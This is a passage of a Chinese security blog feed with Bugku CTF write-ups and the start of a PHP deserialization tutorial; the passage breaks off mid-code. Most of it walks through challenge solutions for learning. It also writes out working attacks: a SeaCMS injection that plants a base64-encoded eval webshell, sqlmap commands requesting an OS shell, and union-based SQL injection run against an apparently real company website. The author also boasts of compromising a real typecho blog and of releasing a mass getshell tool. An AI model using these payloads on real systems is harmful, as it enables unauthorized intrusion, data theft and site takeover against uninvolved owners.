class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>strpos()函数和ereg()函数一样也具有数组绕过漏洞<br>paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/15.php?ctf[]=123asd</span><br></pre></td></tr></table></figure></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a><a href="40">数字验证正则绕过</a></h2><p>题示源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="comment">//preg_match — 执行一个正则表达式匹配</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从第7行代码我们可以知道，除了空白字符和制表符外不能超过12个字符，还有第9行那个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br></pre></td></tr></table></figure></p><p>这个是个字符串flag，真正的flag在26行处。<br>第15行处，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br></pre></td></tr></table></figure></p><p>要求我们传入的参数中，标点，数字，大写小写字母被匹配的次数大于6。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password)) </span><br><span class="line">        $c += <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure></p><p>同时要求我们包含这几种类型至少三种以上，且使password参数和42相等<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=42.00e+0000000000</span><br></pre></td></tr></table></figure></p><p>flag{Bugku_preg_match}</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><a href="27">flag.php</a></h2><blockquote><p>提示信息：点了login咋没反应，提示：hint<br>这题有毒，提示hint，竟然是以hint为参数，随便传入一个值即可获得源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class="container" align="center"&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p>一开始，我把反序列化数据,然后按照<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:21:&quot;ISecer:www.isecer.com&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b26122f446fb.png" alt="Alt text"><br>传了上去，感觉智商再次被侮辱..这个$key变量的值是后面才传入的，所以我们应该传个空的反序列化数据：<br><img src="https://i.loli.net/2018/06/17/5b261218a6a9c.png" alt="Alt text"></p><h2 id="实战2"><a href="#实战2" class="headerlink" title="实战2-"></a>实战2-</h2><p>打开页面，既然题目说了，那就找，点了一遍，发现一个<a href="http://www.kabelindo.co.id/readnews.php?id=18" target="_blank" rel="noopener">http://www.kabelindo.co.id/readnews.php?id=18</a><br>顺手一个单引号，诶报错了,那就来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.kabelindo.co.id/readnews.php?id=18 order by 5 --+ </span><br><span class="line">http://www.kabelindo.co.id/readnews.php?id=18 select 1,2,3,4,5 --+</span><br><span class="line">http://www.kabelindo.co.id/readnews.php?id=18</span><br><span class="line">select 1,version(),database(),4,5 --+</span><br><span class="line">http://www.kabelindo.co.id/readnews.php?id=18</span><br><span class="line">select 1,2,table_name,4,5 from information_schema.tables --+</span><br></pre></td></tr></table></figure></p><p>表名出来了，flag{tbnomax}</p><h2 id="Bugku-cms1"><a href="#Bugku-cms1" class="headerlink" title="Bugku-cms1"></a>Bugku-cms1</h2><p>打开页面，往下一拉，Powered by SongCMS v3.13 免费版<br>日常扫目录，发现一个/data/，打开一看有个sql文件，里面有两个账号密码，分别试了一下，进了后台，找下上传文件的地方<br><img src="https://s1.ax1x.com/2018/04/18/CukCtJ.jpg" alt="CukCtJ.jpg"><br><img src="https://s1.ax1x.com/2018/04/18/CukA6x.jpg" alt="CukA6x.jpg"><br>然后上传成功，菜刀一连，flag就在根目录下</p><h2 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h2><p>照着漏洞来就行了<br><a href="http://www.freebuf.com/vuls/131648.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/131648.html</a></p><h2 id="海洋cms"><a href="#海洋cms" class="headerlink" title="海洋cms"></a>海洋cms</h2><p>个人觉得，这些题考察exp快速搜索能力<br>参考：<a href="https://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/76595817</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8008/search.php?searchtype=5</span><br><span class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;</span><br><span class="line">cmd=fwrite(fopen(&quot;pass.php&quot;,&quot;w&quot;),base64_decode(PD9waHAgZXZhbCgkX1BPU1Rbc3d4XSk7Pz4))</span><br></pre></td></tr></table></figure><p>然后菜刀连接：<br><img src="https://i.imgur.com/le864xM.png" alt=""></p><h2 id="bugku导航"><a href="#bugku导航" class="headerlink" title="bugku导航"></a>bugku导航</h2><p>稍微浏览了一下基本页面，顺手吧目录扫描器开启，发现两个登录的地方：<br>一个是首页用户登录的，放进sqlmap跑了一下，无果。<br>还有一个地方是后台登录的页面:<a href="http://120.24.86.145:9006/admin/login.php#" target="_blank" rel="noopener">http://120.24.86.145:9006/admin/login.php#</a><br>post，burpsuite抓了个包保存到本地，试了一下username参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b26127f136d6.png" alt="Alt text"><br>上webshell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username --os-shell</span><br></pre></td></tr></table></figure></p><p>但是都上传失败了…没爆出网站路径<br>不过我爆了一下敏感数据，拿到了后台管理员账号：<br><img src="https://i.loli.net/2018/06/17/5b2612953b3a6.png" alt="Alt text"><br>后台有很多图片上传的地方，不过上传成功后，都会被改名成.png<br>找到了个添加广告的地方，随便插了一个一句话木马：<br><img src="https://i.loli.net/2018/06/17/5b2612a9a8ece.png" alt="Alt text"><br>插入失败了，又是sql…<br>试试这样：<br><img src="https://i.loli.net/2018/06/17/5b2612c4cd1d4.png" alt="Alt text"><br>没找到广告插在哪个页面了….<br>后来，扫了一下备份文件，把他源码下下来了。flag在根目录。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/04/5b3c8de36b4b7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。&lt;br&gt;本文属i春秋原创奖励计划，禁止转载，&lt;a href=&quot;https://bbs.ichunqiu.com/thread-41915-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://passer6y.fun/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化总结</title>
    <link href="http://passer6y.fun/2018/02/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>http://passer6y.fun/2018/02/19/PHP反序列化总结/</id>
    <published>2018-02-19T12:51:00.000Z</published>
    <updated>2018-06-10T15:21:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2018/06/10/5b1d41bf19383.png" alt=""></p><blockquote><p>起因：最近日站的时候，对一个typecho博客经历几番波折之后，最后找了个typecho反序列化漏洞的exp、写了个webshell..开心的不得了…带着对反序列化漏洞满满的好奇心学习了一番。<br>批量getshell脚本已发布：<a href="https://github.com/Passer6y/typecho_auto_getshell" target="_blank" rel="noopener">github</a>  </p></blockquote><a id="more"></a><h1 id="0x01：相关基础："><a href="#0x01：相关基础：" class="headerlink" title="0x01：相关基础："></a>0x01：相关基础：</h1><h3 id="1-序列化和反序列化相关知识："><a href="#1-序列化和反序列化相关知识：" class="headerlink" title="1.序列化和反序列化相关知识："></a>1.序列化和反序列化相关知识：</h3><h5 id="1-1什么是-反-序列化："><a href="#1-1什么是-反-序列化：" class="headerlink" title="1.1什么是(反)序列化："></a>1.1什么是(反)序列化：</h5><p>序列化是将变量(对象)转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。</p><h5 id="1-2php-反-序列化常见的函数："><a href="#1-2php-反-序列化常见的函数：" class="headerlink" title="1.2php(反)序列化常见的函数："></a>1.2php(反)序列化常见的函数：</h5><p>Serialize、Unserialize、json_encode、json_decode。</p><h5 id="1-3序列化之后的格式："><a href="#1-3序列化之后的格式：" class="headerlink" title="1.3序列化之后的格式："></a>1.3序列化之后的格式：</h5><p>a - array：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:&lt;length&gt;:&#123;key,value pairs&#125;</span><br><span class="line">a:1:&#123;i:1;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>b - boolean：</p><p>d - double</p><p>i - integer</p><p>o - object:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;</span><br><span class="line">O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125; //说明person对象中name属性为Null、age属性为19，sex属性为Null</span><br></pre></td></tr></table></figure></p><p>s - string<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:length:&quot;value&quot;;</span><br><span class="line">s:1:&quot;a&quot;;</span><br></pre></td></tr></table></figure></p><p>N - null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N;</span><br></pre></td></tr></table></figure></p><h3 id="2-php对象常见的魔幻函数"><a href="#2-php对象常见的魔幻函数" class="headerlink" title="2.php对象常见的魔幻函数"></a>2.php对象常见的魔幻函数</h3><ul><li>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</li><li>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</li><li>__toString：当对象被当做一个字符串使用时调用。</li><li>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</li><li>__wakeup:反序列化恢复对象之前调用该方法</li><li>__call:当调用对象中不存在的方法会自动调用该方法。</li><li>__get:在调用私有属性的时候会自动执行</li></ul><blockquote><p>更多见：<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a></p></blockquote><p>测试：<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fom4ifi54jj31eg0ntwiq.jpg" alt=""></p><h3 id="3-php-session序列化和反序列化相关知识"><a href="#3-php-session序列化和反序列化相关知识" class="headerlink" title="3.php_session序列化和反序列化相关知识"></a>3.php_session序列化和反序列化相关知识</h3><h5 id="3-1-php-session处理器"><a href="#3-1-php-session处理器" class="headerlink" title="3.1 php_session处理器"></a>3.1 php_session处理器</h5><ul><li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值  </li><li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值。</li><li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值<br>设置方式：在php_ini中session.serialize_handler(PHP_INI_ALL) 设置，<br>也可以在代码中设置：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br></pre></td></tr></table></figure></li></ul><p>各类存储方式示例：<br>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'a'</span>] = $_GET[<span class="string">'a'</span>];</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>当我传入?a=O:4:”pass”:0:{}时：</p><ul><li>php处理器存储的为：a|s:15:”O:4:”pass”:0:{}”;</li><li>php_serialize处理器存储的为：a:1:{s:1:”a”;s:15:”O:4:”pass”:0:{}”;}</li><li>php_binary处理器存储的为：(乱码了..自己测试吧)</li></ul><h5 id="3-2-php-ini中与php-session相关的配置知识"><a href="#3-2-php-ini中与php-session相关的配置知识" class="headerlink" title="3.2.php_ini中与php_session相关的配置知识"></a>3.2.php_ini中与php_session相关的配置知识</h5><ul><li>session.save_path = “” //设置session的存储路径</li><li>session.auto_start = boolen //指定会话模块是否在请求开始时启动一个会话，默认0(不启动)</li><li>session.serialize_handler = string //指定序列化、反序列化处理器</li></ul><!--##### 3.3.熟悉phpinfo中相关配置 --><h1 id="0x02-常见的漏洞："><a href="#0x02-常见的漏洞：" class="headerlink" title="0x02.常见的漏洞："></a>0x02.常见的漏洞：</h1><h3 id="1-将传来的序列化unserilize，造成魔幻函数执行。"><a href="#1-将传来的序列化unserilize，造成魔幻函数执行。" class="headerlink" title="1 将传来的序列化unserilize，造成魔幻函数执行。"></a>1 将传来的序列化unserilize，造成魔幻函数执行。</h3><p>demo1：</p><blockquote><p>由bugku的一个题启发而写的一个缩略版的demo，原题链接：<a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$password = unserialize($_GET[<span class="string">'password'</span>]);  </span><br><span class="line"><span class="keyword">echo</span> $password;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>关键点：当对象被当作字符串使用时调用__tostring()魔幻函数，所以如果我们给password传入一个序列化的对象，那么echo $password 就会调用魔幻函数。<br>构造payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Flag();</span><br><span class="line">$obj-&gt;file = <span class="string">"Flag.php"</span>; </span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>最后读出flag.php<br><img src="https://s1.ax1x.com/2018/02/20/9NKB79.png" alt=""></p><p>demo2:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'password'</span>]);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这个例子是利用的反序列化恢复对象之前会调用__wakeup()，所以构造payload方法和demo1中一样。<br>将拿到的序列化字符传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9096/test1.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>即可得到flag.php中的文件  </p><p>当然还有其他魔幻函数：__construct、__destruct都行       </p><p><strong>总的来说</strong>：<br>①：有可控的数据被反序列化<br>②：有魔幻函数中敏感代码被执行。</p><h3 id="2-php-session处理器设置不当的漏洞。"><a href="#2-php-session处理器设置不当的漏洞。" class="headerlink" title="2 php session处理器设置不当的漏洞。"></a>2 php session处理器设置不当的漏洞。</h3><blockquote><p>起源于一道CTF，题目传送门:<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p></blockquote><p>题目源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span 